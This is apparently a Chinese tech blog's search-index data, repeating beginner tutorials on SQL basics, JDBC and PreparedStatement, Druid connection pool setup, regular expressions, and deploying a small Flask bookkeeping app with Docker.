实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。 一对一 用于表拆分，提升常用信息的访问速度。 ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:1","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#改"},{"categories":["DATABASE"],"content":" 数据库基础 增新建数据库 CREATE DATABASE {{name}} 新建数据表 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束 建表时添加 CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加 alter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素 EXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,'zeroy','2003-4-10',100) , (2,'admin','2003-4-10',99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务事务能实现多条命令捆绑，一旦失败，会回滚所有操作。 -- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计一对多 如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。 多对多 如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。 实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。 一对一 用于表拆分，提升常用信息的访问速度。 ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:1","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#事务"},{"categories":["DATABASE"],"content":" 数据库基础 增新建数据库 CREATE DATABASE {{name}} 新建数据表 CREATE TABLE {{name}}( {{列名}} {{数据类型}} {{约束}}, ..... ); EXAMPLE: CREATE TABLE Users( id int primary key, name varchar(30) NOT NULL, birthday date, score int NOT NULL ); 添加外键约束 建表时添加 CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 建表后添加 alter table {{表名}} add CONSTRAINT {{键名}} FOREIGN KEY({{当前表列名}}) REFERENCES {{别的表(别的表列名)}} 插入元素 EXAMPLE: 向一张名为users的数据表中插入元素： INSERT INTO users(id,name,birthday,score) VALUES (1,'zeroy','2003-4-10',100) , (2,'admin','2003-4-10',99) 查 SELECT {{列名}} FROM {{表名}} WHERE {{条件}} GROUP BY {{分组字段}} HAVING {{分组后条件}} ORDER BY {{排序字段}} LIMIT {{分页限定}} 改 UPDATE {{表名}} set {{程序语句}} WHERE {{条件}} 事务事务能实现多条命令捆绑，一旦失败，会回滚所有操作。 -- 开启事务 BEGIN; -- 回滚事务 ROLLBACK; -- 提交事务 COMMIT; 数据库设计一对多 如博客系统一个用户对应多篇文章，需要在文章表处引一条外键连向数据表。 多对多 如购物系统中一个商品对应多个订单，一个订单也被多个商品所共有。 实现方式：新建一张表引出两条外键分别连向商品表和订单表的主键，这张数据表的一行代表一件商品与一张订单之间的关系。 一对一 用于表拆分，提升常用信息的访问速度。 ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:1","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#数据库设计"},{"categories":["DATABASE"],"content":" JDBC入门 简介Java数据库连接，（Java Database Connectivity，简称JDBC）是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC也是Sun Microsystems的商标[1]。JDBC是面向关系型数据库的。 步骤注册驱动 Class.forName(\"com.mysql.jdbc.Driver\") 获取连接对象 Connection conn= DriverManager.getConnection(\"jdbc:mysql://127.0.0.1:3306/{{数据库名}}\",\"username\",\"password\"); 获取连接状态 有两种方式，后者可以预处理sql模板。 String sql=\"SELECT * FROM customers\";//查询sql语句 Statement stmt=conn.createStatement(); PreparedStatement pstmt=conn.prepareStatement(sql); 发送查询请求 ResultSet rs=stmt.executeQuery(sql); Resultset rs=pstmt.executeQuery(); 将查询请求封装为对象储存 while(rs.next()) { Customer customer = new Customer(); int customerId = rs.getInt(\"customer_id\"); String firstName = rs.getString(\"firstName\"); String lastName = rs.getString(\"lastName\"); Date birthDate = rs.getDate(\"birthDate\"); int points = rs.getInt(\"points\"); customer.setId(customerId); customer.setBirthDate(birthDate); customer.setFirstName(firstName); customer.setLastName(lastName); customer.setPoints(points); customers.add(customer); } 使用PreparedStatement模板查询或修改数据 使用？作为占位符，在后续代码中再进行数据填充。 String sql=\"insert customers(first_name,last_name,birth_date,points,address,city,state) value(?,?,?,?,?,?,?);\"; PreparedStatement pstmt=conn.prepareStatement(sql); pstmt.setString(1,firstName); pstmt.setString(2,lastName); pstmt.setDate(3,birthDate); pstmt.setInt(4,points); pstmt.setString(5,addtress); pstmt.setString(6,city); pstmt.setString(7,state); 这样做的优点是可以预防SQL注入。 PreparedStatement对象会对输入的字符串做转义处理，可以防止原理为简单字符串拼接生效的SQL注入。（当然还有模板注入防不了） ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:2","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#jdbc入门"},{"categories":["DATABASE"],"content":" JDBC入门 简介Java数据库连接，（Java Database Connectivity，简称JDBC）是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC也是Sun Microsystems的商标[1]。JDBC是面向关系型数据库的。 步骤注册驱动 Class.forName(\"com.mysql.jdbc.Driver\") 获取连接对象 Connection conn= DriverManager.getConnection(\"jdbc:mysql://127.0.0.1:3306/{{数据库名}}\",\"username\",\"password\"); 获取连接状态 有两种方式，后者可以预处理sql模板。 String sql=\"SELECT * FROM customers\";//查询sql语句 Statement stmt=conn.createStatement(); PreparedStatement pstmt=conn.prepareStatement(sql); 发送查询请求 ResultSet rs=stmt.executeQuery(sql); Resultset rs=pstmt.executeQuery(); 将查询请求封装为对象储存 while(rs.next()) { Customer customer = new Customer(); int customerId = rs.getInt(\"customer_id\"); String firstName = rs.getString(\"firstName\"); String lastName = rs.getString(\"lastName\"); Date birthDate = rs.getDate(\"birthDate\"); int points = rs.getInt(\"points\"); customer.setId(customerId); customer.setBirthDate(birthDate); customer.setFirstName(firstName); customer.setLastName(lastName); customer.setPoints(points); customers.add(customer); } 使用PreparedStatement模板查询或修改数据 使用？作为占位符，在后续代码中再进行数据填充。 String sql=\"insert customers(first_name,last_name,birth_date,points,address,city,state) value(?,?,?,?,?,?,?);\"; PreparedStatement pstmt=conn.prepareStatement(sql); pstmt.setString(1,firstName); pstmt.setString(2,lastName); pstmt.setDate(3,birthDate); pstmt.setInt(4,points); pstmt.setString(5,addtress); pstmt.setString(6,city); pstmt.setString(7,state); 这样做的优点是可以预防SQL注入。 PreparedStatement对象会对输入的字符串做转义处理，可以防止原理为简单字符串拼接生效的SQL注入。（当然还有模板注入防不了） ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:2","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#简介"},{"categories":["DATABASE"],"content":" JDBC入门 简介Java数据库连接，（Java Database Connectivity，简称JDBC）是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC也是Sun Microsystems的商标[1]。JDBC是面向关系型数据库的。 步骤注册驱动 Class.forName(\"com.mysql.jdbc.Driver\") 获取连接对象 Connection conn= DriverManager.getConnection(\"jdbc:mysql://127.0.0.1:3306/{{数据库名}}\",\"username\",\"password\"); 获取连接状态 有两种方式，后者可以预处理sql模板。 String sql=\"SELECT * FROM customers\";//查询sql语句 Statement stmt=conn.createStatement(); PreparedStatement pstmt=conn.prepareStatement(sql); 发送查询请求 ResultSet rs=stmt.executeQuery(sql); Resultset rs=pstmt.executeQuery(); 将查询请求封装为对象储存 while(rs.next()) { Customer customer = new Customer(); int customerId = rs.getInt(\"customer_id\"); String firstName = rs.getString(\"firstName\"); String lastName = rs.getString(\"lastName\"); Date birthDate = rs.getDate(\"birthDate\"); int points = rs.getInt(\"points\"); customer.setId(customerId); customer.setBirthDate(birthDate); customer.setFirstName(firstName); customer.setLastName(lastName); customer.setPoints(points); customers.add(customer); } 使用PreparedStatement模板查询或修改数据 使用？作为占位符，在后续代码中再进行数据填充。 String sql=\"insert customers(first_name,last_name,birth_date,points,address,city,state) value(?,?,?,?,?,?,?);\"; PreparedStatement pstmt=conn.prepareStatement(sql); pstmt.setString(1,firstName); pstmt.setString(2,lastName); pstmt.setDate(3,birthDate); pstmt.setInt(4,points); pstmt.setString(5,addtress); pstmt.setString(6,city); pstmt.setString(7,state); 这样做的优点是可以预防SQL注入。 PreparedStatement对象会对输入的字符串做转义处理，可以防止原理为简单字符串拼接生效的SQL注入。（当然还有模板注入防不了） ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:2","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#步骤"},{"categories":["DATABASE"],"content":" Druid数据库连接池的简单使用 简介在软件工程中，连接池（英语：connection pool）是维护的数据库连接的缓存，以便在将来需要对数据库发出请求时可以重用连接。 连接池用于提高在数据库上执行命令的性能。为每个用户打开和维护数据库连接，尤其是对动态数据库驱动的网站应用程序发出的请求，既昂贵又浪费资源。在连接池中，创建连接之后，将连接放在池中并再次使用，这样就不必创建新的连接。如果所有连接都正在使用，则创建一个新连接并将其添加到池中。连接池还减少了用户必须等待创建与数据库的连接的时间。 Druid是由阿里巴巴开发的数据库连接池。 配置文件的书写 driverClassName=com.mysql.jdbc.Driver url={{数据库地址}} username={{your username}} password={{your password}} # 默认连接数 initialSize=5 # 最大连接数 maxActive=10 # 最长等待时间 maxWait=3000 从数据库连接池中获取连接 Properties prop=new Properties(); prop.load(new FileInputStream(\"src/druid.properties\"));//填写druid配置文件的路径 DataSource dataSource= DruidDataSourceFactory.createDataSource(prop); Connection conn=dataSource.getConnection(); ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:3","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#druid数据库连接池的简单使用"},{"categories":["DATABASE"],"content":" Druid数据库连接池的简单使用 简介在软件工程中，连接池（英语：connection pool）是维护的数据库连接的缓存，以便在将来需要对数据库发出请求时可以重用连接。 连接池用于提高在数据库上执行命令的性能。为每个用户打开和维护数据库连接，尤其是对动态数据库驱动的网站应用程序发出的请求，既昂贵又浪费资源。在连接池中，创建连接之后，将连接放在池中并再次使用，这样就不必创建新的连接。如果所有连接都正在使用，则创建一个新连接并将其添加到池中。连接池还减少了用户必须等待创建与数据库的连接的时间。 Druid是由阿里巴巴开发的数据库连接池。 配置文件的书写 driverClassName=com.mysql.jdbc.Driver url={{数据库地址}} username={{your username}} password={{your password}} # 默认连接数 initialSize=5 # 最大连接数 maxActive=10 # 最长等待时间 maxWait=3000 从数据库连接池中获取连接 Properties prop=new Properties(); prop.load(new FileInputStream(\"src/druid.properties\"));//填写druid配置文件的路径 DataSource dataSource= DruidDataSourceFactory.createDataSource(prop); Connection conn=dataSource.getConnection(); ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:3","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#简介-1"},{"categories":["DATABASE"],"content":" Druid数据库连接池的简单使用 简介在软件工程中，连接池（英语：connection pool）是维护的数据库连接的缓存，以便在将来需要对数据库发出请求时可以重用连接。 连接池用于提高在数据库上执行命令的性能。为每个用户打开和维护数据库连接，尤其是对动态数据库驱动的网站应用程序发出的请求，既昂贵又浪费资源。在连接池中，创建连接之后，将连接放在池中并再次使用，这样就不必创建新的连接。如果所有连接都正在使用，则创建一个新连接并将其添加到池中。连接池还减少了用户必须等待创建与数据库的连接的时间。 Druid是由阿里巴巴开发的数据库连接池。 配置文件的书写 driverClassName=com.mysql.jdbc.Driver url={{数据库地址}} username={{your username}} password={{your password}} # 默认连接数 initialSize=5 # 最大连接数 maxActive=10 # 最长等待时间 maxWait=3000 从数据库连接池中获取连接 Properties prop=new Properties(); prop.load(new FileInputStream(\"src/druid.properties\"));//填写druid配置文件的路径 DataSource dataSource= DruidDataSourceFactory.createDataSource(prop); Connection conn=dataSource.getConnection(); ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:3","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#配置文件的书写"},{"categories":["DATABASE"],"content":" Druid数据库连接池的简单使用 简介在软件工程中，连接池（英语：connection pool）是维护的数据库连接的缓存，以便在将来需要对数据库发出请求时可以重用连接。 连接池用于提高在数据库上执行命令的性能。为每个用户打开和维护数据库连接，尤其是对动态数据库驱动的网站应用程序发出的请求，既昂贵又浪费资源。在连接池中，创建连接之后，将连接放在池中并再次使用，这样就不必创建新的连接。如果所有连接都正在使用，则创建一个新连接并将其添加到池中。连接池还减少了用户必须等待创建与数据库的连接的时间。 Druid是由阿里巴巴开发的数据库连接池。 配置文件的书写 driverClassName=com.mysql.jdbc.Driver url={{数据库地址}} username={{your username}} password={{your password}} # 默认连接数 initialSize=5 # 最大连接数 maxActive=10 # 最长等待时间 maxWait=3000 从数据库连接池中获取连接 Properties prop=new Properties(); prop.load(new FileInputStream(\"src/druid.properties\"));//填写druid配置文件的路径 DataSource dataSource= DruidDataSourceFactory.createDataSource(prop); Connection conn=dataSource.getConnection(); ","date":"2022-02-07","objectID":"/articles/database-for-beginner/:0:3","series":null,"tags":null,"title":"数据库基础|JDBC入门|Druid连接池的简单配置","uri":"/articles/database-for-beginner/#从数据库连接池中获取连接"},{"categories":["Basic tools"],"content":" 简介正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。 语法总结需要转义的特殊字符： .[{()\\^$|?*+ 就像在其它任何语言中那样，转义需要在符号前加上\\。 匹配规则： . - 除了新行外的任何字符 \\d - 数字 (0-9) \\D - 非数字 (0-9) \\w - 单词字母 (a-z, A-Z, 0-9, _) \\W - 非单词字母 \\s - 空字符 (space, tab, newline) \\S - 非空字符 (space, tab, newline) \\b - 单词边界 \\B - 非单词边界 ^ - 字符串开头（默认将一行看作一整个字符串） $ - 字符串结尾（默认将一行看作一整个字符串） [] - 匹配字符集 [^ ] - 匹配除了字符集外的字符 | - 或者 ( ) - Group Quantifiers: * - 0 or More + - 1 or More ? - 0 or One {3} - Exact Number {3,4} - Range of Numbers (Minimum, Maximum) [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 一些例子： 匹配人名： Mr. Schafer Mr Smith Ms Davis Mrs. Robinson Mr. T M(r|s|rs)\\.?\\s[A-Z]\\w* 匹配两种格式的电话号码： 123.555.1234 800-555-4321 900-555-4321 \\d{3}[.-]\\d{3}[.-]\\d{4} 匹配三种格式的电子邮件： CoreyMSchafer@gmail.com corey.schafer@university.edu corey-321-schafer@my-work.net [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 按Group引用提取文件中的url，并截取出其中的顶级域名： https://www.google.com http://coreyms.com https://youtube.com https://www.nasa.gov 匹配https?://(www\\.)?(\\w+)(\\.\\w+) 引用：$2$3 结果： google.com coreyms.com youtube.com nasa.gov ","date":"2022-02-03","objectID":"/articles/regular-expression/:0:0","series":null,"tags":null,"title":"正则表达式 For Beginner","uri":"/articles/regular-expression/#"},{"categories":["Basic tools"],"content":" 简介正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。 语法总结需要转义的特殊字符： .[{()\\^$|?*+ 就像在其它任何语言中那样，转义需要在符号前加上\\。 匹配规则： . - 除了新行外的任何字符 \\d - 数字 (0-9) \\D - 非数字 (0-9) \\w - 单词字母 (a-z, A-Z, 0-9, _) \\W - 非单词字母 \\s - 空字符 (space, tab, newline) \\S - 非空字符 (space, tab, newline) \\b - 单词边界 \\B - 非单词边界 ^ - 字符串开头（默认将一行看作一整个字符串） $ - 字符串结尾（默认将一行看作一整个字符串） [] - 匹配字符集 [^ ] - 匹配除了字符集外的字符 | - 或者 ( ) - Group Quantifiers: * - 0 or More + - 1 or More ? - 0 or One {3} - Exact Number {3,4} - Range of Numbers (Minimum, Maximum) [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 一些例子： 匹配人名： Mr. Schafer Mr Smith Ms Davis Mrs. Robinson Mr. T M(r|s|rs)\\.?\\s[A-Z]\\w* 匹配两种格式的电话号码： 123.555.1234 800-555-4321 900-555-4321 \\d{3}[.-]\\d{3}[.-]\\d{4} 匹配三种格式的电子邮件： CoreyMSchafer@gmail.com corey.schafer@university.edu corey-321-schafer@my-work.net [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 按Group引用提取文件中的url，并截取出其中的顶级域名： https://www.google.com http://coreyms.com https://youtube.com https://www.nasa.gov 匹配https?://(www\\.)?(\\w+)(\\.\\w+) 引用：$2$3 结果： google.com coreyms.com youtube.com nasa.gov ","date":"2022-02-03","objectID":"/articles/regular-expression/:0:0","series":null,"tags":null,"title":"正则表达式 For Beginner","uri":"/articles/regular-expression/#简介"},{"categories":["Basic tools"],"content":" 简介正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。 语法总结需要转义的特殊字符： .[{()\\^$|?*+ 就像在其它任何语言中那样，转义需要在符号前加上\\。 匹配规则： . - 除了新行外的任何字符 \\d - 数字 (0-9) \\D - 非数字 (0-9) \\w - 单词字母 (a-z, A-Z, 0-9, _) \\W - 非单词字母 \\s - 空字符 (space, tab, newline) \\S - 非空字符 (space, tab, newline) \\b - 单词边界 \\B - 非单词边界 ^ - 字符串开头（默认将一行看作一整个字符串） $ - 字符串结尾（默认将一行看作一整个字符串） [] - 匹配字符集 [^ ] - 匹配除了字符集外的字符 | - 或者 ( ) - Group Quantifiers: * - 0 or More + - 1 or More ? - 0 or One {3} - Exact Number {3,4} - Range of Numbers (Minimum, Maximum) [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 一些例子： 匹配人名： Mr. Schafer Mr Smith Ms Davis Mrs. Robinson Mr. T M(r|s|rs)\\.?\\s[A-Z]\\w* 匹配两种格式的电话号码： 123.555.1234 800-555-4321 900-555-4321 \\d{3}[.-]\\d{3}[.-]\\d{4} 匹配三种格式的电子邮件： CoreyMSchafer@gmail.com corey.schafer@university.edu corey-321-schafer@my-work.net [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 按Group引用提取文件中的url，并截取出其中的顶级域名： https://www.google.com http://coreyms.com https://youtube.com https://www.nasa.gov 匹配https?://(www\\.)?(\\w+)(\\.\\w+) 引用：$2$3 结果： google.com coreyms.com youtube.com nasa.gov ","date":"2022-02-03","objectID":"/articles/regular-expression/:0:0","series":null,"tags":null,"title":"正则表达式 For Beginner","uri":"/articles/regular-expression/#语法总结"},{"categories":["Basic tools"],"content":" 简介正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。 语法总结需要转义的特殊字符： .[{()\\^$|?*+ 就像在其它任何语言中那样，转义需要在符号前加上\\。 匹配规则： . - 除了新行外的任何字符 \\d - 数字 (0-9) \\D - 非数字 (0-9) \\w - 单词字母 (a-z, A-Z, 0-9, _) \\W - 非单词字母 \\s - 空字符 (space, tab, newline) \\S - 非空字符 (space, tab, newline) \\b - 单词边界 \\B - 非单词边界 ^ - 字符串开头（默认将一行看作一整个字符串） $ - 字符串结尾（默认将一行看作一整个字符串） [] - 匹配字符集 [^ ] - 匹配除了字符集外的字符 | - 或者 ( ) - Group Quantifiers: * - 0 or More + - 1 or More ? - 0 or One {3} - Exact Number {3,4} - Range of Numbers (Minimum, Maximum) [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 一些例子： 匹配人名： Mr. Schafer Mr Smith Ms Davis Mrs. Robinson Mr. T M(r|s|rs)\\.?\\s[A-Z]\\w* 匹配两种格式的电话号码： 123.555.1234 800-555-4321 900-555-4321 \\d{3}[.-]\\d{3}[.-]\\d{4} 匹配三种格式的电子邮件： CoreyMSchafer@gmail.com corey.schafer@university.edu corey-321-schafer@my-work.net [a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[0-9a-zA-Z.-]+ 按Group引用提取文件中的url，并截取出其中的顶级域名： https://www.google.com http://coreyms.com https://youtube.com https://www.nasa.gov 匹配https?://(www\\.)?(\\w+)(\\.\\w+) 引用：$2$3 结果： google.com coreyms.com youtube.com nasa.gov ","date":"2022-02-03","objectID":"/articles/regular-expression/:0:0","series":null,"tags":null,"title":"正则表达式 For Beginner","uri":"/articles/regular-expression/#按group引用"},{"categories":["Python-Flask"],"content":" 功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结构 Demo 项目地址 技术路线后端：python-Flask 前端：BootStrap 踩过的坑 程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为’None’） Docker应用部署细节Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。 使用阿里云作为Docker Hub。 #注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。 docker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","date":"2022-02-01","objectID":"/tallyapp1/:0:0","series":null,"tags":null,"title":"Flask学习1 TallyApp beta 0.9","uri":"/tallyapp1/#"},{"categories":["Python-Flask"],"content":" 功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结构 Demo 项目地址 技术路线后端：python-Flask 前端：BootStrap 踩过的坑 程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为’None’） Docker应用部署细节Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。 使用阿里云作为Docker Hub。 #注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。 docker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","date":"2022-02-01","objectID":"/tallyapp1/:0:0","series":null,"tags":null,"title":"Flask学习1 TallyApp beta 0.9","uri":"/tallyapp1/#功能描述"},{"categories":["Python-Flask"],"content":" 功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结构 Demo 项目地址 技术路线后端：python-Flask 前端：BootStrap 踩过的坑 程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为’None’） Docker应用部署细节Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。 使用阿里云作为Docker Hub。 #注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。 docker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","date":"2022-02-01","objectID":"/tallyapp1/:0:0","series":null,"tags":null,"title":"Flask学习1 TallyApp beta 0.9","uri":"/tallyapp1/#基本结构"},{"categories":["Python-Flask"],"content":" 功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结构 Demo 项目地址 技术路线后端：python-Flask 前端：BootStrap 踩过的坑 程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为’None’） Docker应用部署细节Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。 使用阿里云作为Docker Hub。 #注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。 docker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","date":"2022-02-01","objectID":"/tallyapp1/:0:0","series":null,"tags":null,"title":"Flask学习1 TallyApp beta 0.9","uri":"/tallyapp1/#技术路线"},{"categories":["Python-Flask"],"content":" 功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结构 Demo 项目地址 技术路线后端：python-Flask 前端：BootStrap 踩过的坑 程序开始时数据库需要已经初始化完毕db.create_all() 使用get方法传参会出未知问题，故全部改为使用url传参 浮点误差会让数据很奇怪，注意保留两位小数 不同的数据类型（pandas与string）可能会让数据显示异常（空数据显示为’None’） Docker应用部署细节Flask本身不带服务器，使用gunicorn来使得web应用能够在服务器上被访问。 使用阿里云作为Docker Hub。 #注册完阿里云的镜像服务之后 #登录 docker login --username={{your username}} registry.cn-hangzhou.aliyuncs.com/ #命名并上传本地docker镜像 docker tag tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} docker push tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} #拉取镜像 docker pull tallyapp registry.cn-hangzhou.aliyuncs.com/tally_app/tallyapp:{{version}} 将本地数据库挂载到Docker容器中，并运行容器。 docker run -d -p 8080:8080 -v /database:/soft/TallyApp/database {{images_id}} ","date":"2022-02-01","objectID":"/tallyapp1/:0:0","series":null,"tags":null,"title":"Flask学习1 TallyApp beta 0.9","uri":"/tallyapp1/#踩过的坑"},{"categories":["Python-Flask"],"content":" 功能描述 支持注册和登录 支持简单的分类记账 支持以饼图的形式展现各个分类占总体收支的数目 支持增删改数据 支持以一定的xlsx格式导入导出数据 基本结构 Demo 项目地址 技术路线后端：python-Flask 前端：BootStrap 踩过的坑 程序开始时数据库需要已经初始化完毕db.create_all() 